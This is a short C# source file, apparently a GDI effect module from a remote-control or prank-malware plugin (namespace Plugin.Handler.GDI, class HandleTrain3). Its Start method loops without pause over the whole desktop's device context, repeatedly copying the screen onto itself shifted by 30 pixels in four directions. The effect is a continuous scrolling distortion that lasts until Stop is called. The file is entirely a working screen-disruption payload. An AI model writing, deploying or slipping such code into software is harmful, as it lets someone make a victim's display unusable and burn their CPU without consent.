using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleTrain3
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop == null || ctsStop.IsCancellationRequested)
		{
			ctsStop = new CancellationTokenSource();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			while (!ctsStop.IsCancellationRequested)
			{
				IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, -30, 0, 13369376u);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, width - 30, 0, 13369376u);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, 0, -30, 13369376u);
				NativeMethods.BitBlt(dC, 0, 0, width, height, dC, 0, height - 30, 13369376u);
				NativeMethods.ReleaseDC(IntPtr.Zero, dC);
			}
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
